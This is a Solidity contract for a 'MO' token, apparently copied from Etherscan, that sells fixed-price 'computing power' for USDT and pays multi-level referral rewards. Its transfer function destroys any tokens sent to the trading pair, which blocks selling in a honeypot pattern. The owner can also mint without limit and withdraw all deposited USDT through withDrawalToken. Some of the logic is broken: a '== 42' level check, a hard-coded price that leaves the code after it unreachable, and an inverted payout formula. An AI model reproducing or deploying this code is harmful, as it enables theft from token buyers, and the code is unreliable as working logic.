/**
 *Submitted for verification at Etherscan.io on 2022-06-10
*/

pragma solidity ^0.8.0;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

contract TokenReceiver{
    constructor (address token) {
        IERC20(token).approve(msg.sender, 10000000000*1e18);
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MoToken is IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  uint256 private _dayAmount; //每日产出数量
  uint256 public _lastTime; //上一次产币时间

  address public uniswapRouterV2Address;  //uniswap合约地址
  address private usdtAddress;  //usdt合约地址
  address private destroyAddress = address(0x000000000000000000000000000000000000dEaD);
  IUniswapV2Router02 public immutable uniswapV2Router;
  address public uniswapV2Pair;  //LP地址
  
  address public tokenReceiver;

   uint256 public limitAmount = 200 * 1e18; //单次限制购买数量
   uint256 public inviterRewards = 80 * 1e18; //推荐奖励数量
   uint256 public dynamicRewards = 20 * 1e18; //动态奖励数量

  mapping(address => address[]) public inviter; //推荐者地址 地址=>上级列表
  mapping (address => uint256) public _userPower; //用户算力
  address[] _userList; //用户列表 用来遍历用户算力
  mapping (address => uint256) public _userMaxIncome; //用户最大收益金额
  mapping (address => uint256) public _userIncome; //用户收益金额 U
  mapping (address => uint256) public _userMO; //用户根据算力分配得到的MO数量
  uint256 public _totalPower; //全网总算力
  uint public _userNumV1;
  uint public _userNumV2;
  uint public _userNumV3;
  uint public _userNumV4;
  event BuyPower(address indexed sender, uint  amount);
  event WithDrawalToken(address indexed token, address indexed sender, uint indexed amount);

  //constructor(address _route,address _USDToken) {
  constructor() {      
    _name = "MO";
    _symbol = "MO";
    _decimals = 18;
    _owner = msg.sender;
    _totalSupply = 1000 * 10000 * 10**uint256(_decimals);
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
    _dayAmount = 2602 * 10**uint256(_decimals); //日产币量 2602个

    uniswapRouterV2Address = address(0x8F065Db2d8a04747Df51efB5136A6a2bb9FB92cE);
    usdtAddress = address(0x65Be4eD28C95535f190780BF9235001F699C89c0);
    
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniswapRouterV2Address);
    //创建池子 LP
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), usdtAddress);    
    //uniswapV2Pair = address(0);
    uniswapV2Router = _uniswapV2Router;    

    tokenReceiver = address(new TokenReceiver(address(usdtAddress)));
    _lastTime = block.timestamp;
  }

  function buyPower(uint256 amount) external returns(bool){
    require(amount == limitAmount, 'Amount: must be limit amount');
    address sender = msg.sender;
    //算力收益分配 先产币
    _powerRewards();    
    //增加用户算力
    _addUserPower(sender, amount);        
    //添加到用户列表
    _addUserList(sender);
    //用户最大收益增加双倍
    _userMaxIncome[sender] = _userMaxIncome[sender].add(limitAmount.mul(2));
    //全网总算力增加
    _totalPower = _totalPower.add(limitAmount);    
    //发送推荐奖励
    uint256 _remainingReward = _sendInviterRewards(); //返回剩余数量
    //发送动态奖励
    _remainingReward = _remainingReward.add(_senddynamicRewards());
    //薄饼自动购买MO 直接转到黑洞地址 100U TODO
    //buyMo(limitAmount.div(2).add(_remainingReward));
    //一半转到合约 用于用户提取奖励
    //IERC20(usdtAddress).approve(address(this), limitAmount.div(2).add(_remainingReward));
    IERC20(usdtAddress).transferFrom(sender, address(this), limitAmount.div(2).add(_remainingReward));
    emit BuyPower(sender, limitAmount);
    return true;
  }
  //增加用户算力
  function _addUserPower(address _user,uint amount) private{ 
    uint _oldLevel = _getLevel(_user);  
    _userPower[_user] = _userPower[_user].add(amount);
    uint _newLevel = _getLevel(_user);
    if(_oldLevel != _newLevel) {
      if(_oldLevel == 1){
          _userNumV1 = _userNumV1.sub(1);
      } else if(_oldLevel == 2){
          _userNumV2 = _userNumV2.sub(1);
      } else if(_oldLevel == 3){
          _userNumV3 = _userNumV3.sub(1);
      } else if(_oldLevel == 4){
          _userNumV4 = _userNumV4.sub(1);
      } 
      if(_newLevel == 1){
          _userNumV1 = _userNumV1.add(1);
      } else if(_newLevel == 2){
          _userNumV2 = _userNumV2.add(1);
      } else if(_newLevel == 3){
          _userNumV3 = _userNumV3.add(1);
      } else if(_newLevel == 4){
          _userNumV4 = _userNumV4.add(1);
      }       
    } 
  }
  //根据数量获取等级
  function _getLevel(address _user) private returns(uint){
    uint amount = _userPower[_user];
    //1万 3万 5万 6万 
    if (amount >= 60000 * 1e18){
        return 4;
    }
    if (amount >= 50000 * 1e18){
        return 3;
    }
    if (amount >= 30000 * 1e18){
        return 2;
    }        
    if (amount >= 10000 * 1e18){
        return 1;
    }
    return 0;
  }
  //添加到用户列表
  function _addUserList(address _user) private{
    bool _find = false;
    for(uint i = 0; i < _userList.length; i++) {
        if(_userList[i] == _user){
            _find = true;
            break;
        }
    }
    if(_find == false){
        _userList.push(_user);
    }
  }
  //发送推荐奖励
  function _sendInviterRewards() private returns (uint256){
      address sender = msg.sender;
      uint256 _remainingReward = inviterRewards;
      uint256 _userRewards = inviterRewards.div(10); //单个用户得到的奖励数量 80U/10
      if(inviter[sender].length == 0){
        return _remainingReward;
      }
      for(uint i = 0; i < inviter[sender].length; i++) {
        address _inviter = inviter[sender][i];        
        if(_userPower[_inviter] > 0){ //需要查询用户是否出局再发放奖励 TODO
            //用户已收益价值
            uint256 _userRewards = _getUserRewards(_inviter);
            //如果用户已收益价值 >= 用户最大收益金额 跳过不发放奖励
            if(_userRewards >= _userMaxIncome[_inviter]){
                continue;
            }
            //如果待收益金额 < 本次发送奖励，则本次发放奖励 = 待收益金额
            if(_userMaxIncome[_inviter] - _userRewards < _userRewards){
                _userRewards = _userMaxIncome[_inviter] - _userRewards;
            }
            _userIncome[_inviter] = _userIncome[_inviter].add(_userRewards);
            _remainingReward = _remainingReward.sub(_userRewards);
        }
      }
      return _remainingReward;
  }
  //发送动态奖励
  function _senddynamicRewards() private returns(uint256) {  
      uint256 _remainingReward = dynamicRewards; //20U = 1 + 4 + 6 + 9
      uint256 _rewards;  //平均每人发放奖励
      //发放V1奖励
      //_rewards = 1 * 1e18 / _userNumV1;  
      for(uint i = 0; i < _userList.length; i++) {
        address _user = _userList[i];
        //等级不够直接跳过
        uint _userLevel = _getLevel(_user);
        if (_userLevel == 0){
            continue;
        }
        if(_userLevel == 1){
          _rewards = 1 * 1e18 / _userNumV1;  
        } else if(_userLevel == 2){
          _rewards = 4 * 1e18 / _userNumV2;  
         } else if(_userLevel == 3){
          _rewards = 6 * 1e18 / _userNumV3;  
        } else if(_userLevel == 42){
          _rewards = 9 * 1e18 / _userNumV4;  
        }        
        //用户已收益价值
        uint256 _userRewards = _getUserRewards(_user);
        //如果用户已收益价值 >= 用户最大收益金额 跳过不发放奖励
        if(_userRewards >= _userMaxIncome[_user]){
            continue;
        }
        //如果待收益金额 < 本次发送奖励，则本次发放奖励 = 待收益金额
        if(_userMaxIncome[_user] - _userRewards < _rewards){
            _rewards = _userMaxIncome[_user] - _userRewards;
        }       
        _userIncome[_user] = _userIncome[_user].add(_rewards);
        _remainingReward = _remainingReward.sub(_rewards); 
      }
        
      return _remainingReward; 
  }
  //获取用户已收益价值
  function _getUserRewards(address _user) private returns(uint256){
    //计算代币价值
    uint256 _moPrice = getMoPrice();
    uint256 _moValue = _userMO[_user].mul(_moPrice).div(10**uint256(_decimals));
    uint256 _userRewards = _moValue.add(_userIncome[_user]); //已发放奖励 = 代币价值 + 用户收益金额
    return _userRewards;
  }
  //获取用户待产出的MO数量
  function _getUserMo(address _user, uint256 _endTime ) private returns (uint256){
      //
      uint256 _TimeDifference = _endTime - _lastTime; //间隔(秒) 距离上一次产币时间
      uint256 _secondAmount = _dayAmount.div(86400); //每秒产币数量
      // 每秒产币数量 * 间隔(秒) * / 全网算力 * 用户算力
      uint256 _moAmount = _secondAmount.mul(_TimeDifference).mul(_totalPower).div(_userPower[_user]); 
      return _moAmount;  
  }
  //算力收益分配 产币
  function _powerRewards() private{
    uint256 _endTime = block.timestamp;  
    for(uint i = 0; i < _userList.length; i++) {
        address _user = _userList[i];
        _userMO[_user] = _userMO[_user].add(_getUserMo(_user, _endTime));
    }
    _lastTime = _endTime;
  }
  //获取MO价格 TODO
  function getMoPrice() public view returns(uint256){
    return 0.1 * 1e18;
    address[] memory path = new address[](2);
    path[0] = usdtAddress;
    path[1] = address(this);
    uint256[] memory _amounts = uniswapV2Router.getAmountsOut(10**uint256(_decimals),path);
    return _amounts[1];
  }
  //薄饼购买MO
  function buyMo(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = usdtAddress;
    path[1] = address(this);

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        0, 
        path,
        destroyAddress,
        block.timestamp
    );   
  }
  //设置推荐者 只能设置一次
  function setInviter(address account) public returns (bool){
    require(msg.sender != address(0), "cannot be set inviter to zero address");
    require(inviter[msg.sender].length == 0, "Accout is owned inviter");    
    for(uint i = 0; i < inviter[account].length; i++) {
      inviter[msg.sender].push(inviter[account][i]);
    }
    inviter[msg.sender].push(account);
    return true;
  }
  //获取推荐者
  function getInviter(address account) external view returns (address){
      if(inviter[account].length == 0){
          return address(0);
      }
      return inviter[account][0];
  }
  //全网总算力
  function totalPower() external view returns (uint256){
      //计算全网总算力 TODO
      return _totalPower;
  }
  //设置池子地址
  function setUniswapV2Pair(address _uniswapV2Pair) external onlyOwner {
      uniswapV2Pair = _uniswapV2Pair;
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view override returns (uint256) {
    //TODO 计算总发行量 已发行 + 待发放数量
    return _totalSupply;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(msg.sender, amount);
    return true;
  }

  function burn(uint256 amount) public returns (bool) {
    _burn(msg.sender, amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    //判断是否swap购买代币 如果发送方是LP地址，则全部转到黑洞地址销毁
    if (recipient == uniswapV2Pair){
      _balances[destroyAddress] = _balances[destroyAddress].add(amount);
      emit Transfer(sender, destroyAddress, amount);
    }else{
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount, "BEP20: burn amount exceeds allowance"));
  }

  function changeRouter(address router) public onlyOwner {
    uniswapV2Pair = router;
  }

  function withDrawalToken(address token, address _address, uint amount) external onlyOwner returns(bool){
    IERC20(token).transfer(_address, amount);
    emit WithDrawalToken(token, _address, amount);
    return true;
  }
}